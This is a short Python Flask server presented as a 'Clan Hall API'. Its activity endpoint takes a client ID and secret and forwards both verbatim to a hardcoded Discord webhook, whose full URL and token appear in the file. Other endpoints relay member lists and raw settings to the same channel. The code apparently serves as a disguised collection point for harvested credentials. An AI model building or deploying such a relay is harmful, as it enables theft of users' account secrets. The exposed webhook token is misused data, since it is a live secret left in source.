from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1390452061723955240/1-ymXdkl552bfpT8M8szpRlTBdX48GE33SVEkJ0nHCcCz3_SXLDvwTVXYSW2WyHY8p9m"

@app.route('/')
def index():
    return "Clan Hall API is running.", 200

@app.route('/api/activity', methods=['POST'])
def receive_activity():
    try:
        data = request.get_json(force=True, silent=True) or {}
        print("Received /api/activity data:", data)

        if not data:
            return jsonify({"error": "No JSON data received"}), 400

        client_id = data.get("client_id")
        secret = data.get("secret")
        if not client_id or not secret:
            return jsonify({"error": "Missing client_id or secret"}), 400

        embed = {
            "title": "Clan Hall Activity",
            "fields": [
                {"name": "Client ID", "value": client_id, "inline": True},
                {"name": "Secret", "value": secret, "inline": True}
            ]
        }

        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
        return jsonify({"success": True}), 200

    except Exception as e:
        print("Error in /api/activity:", str(e))
        return jsonify({"error": "Server error"}), 500

@app.route('/api/members', methods=['POST'])
def receive_members():
    try:
        data = request.get_json(force=True, silent=True) or {}
        print("Received /api/members data:", data)

        members = data.get("members", [])
        if not members:
            return jsonify({"error": "No members provided"}), 400

        member_list = "\n".join(members)
        content = f"**Clan Members:**\n{member_list}"
        requests.post(DISCORD_WEBHOOK_URL, json={"content": content})

        return jsonify({"success": True}), 200

    except Exception as e:
        print("Error in /api/members:", str(e))
        return jsonify({"error": "Server error"}), 500

@app.route('/api/settings', methods=['POST'])
def receive_settings():
    try:
        data = request.get_json(force=True, silent=True) or {}
        print("Received /api/settings data:", data)

        content = f"**Clan Hall Settings Updated**\n```json\n{data}```"
        requests.post(DISCORD_WEBHOOK_URL, json={"content": content})

        return jsonify({"success": True}), 200

    except Exception as e:
        print("Error in /api/settings:", str(e))
        return jsonify({"error": "Server error"}), 500

# Valgfrit ekstra endpoint til test/debug:
@app.route('/api/debug', methods=['POST'])
def debug():
    try:
        data = request.get_json(force=True, silent=True) or {}
        print("DEBUG DATA:", data)
        return jsonify(data), 200
    except Exception as e:
        print("DEBUG ERROR:", str(e))
        return jsonify({"error": "debug failed"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

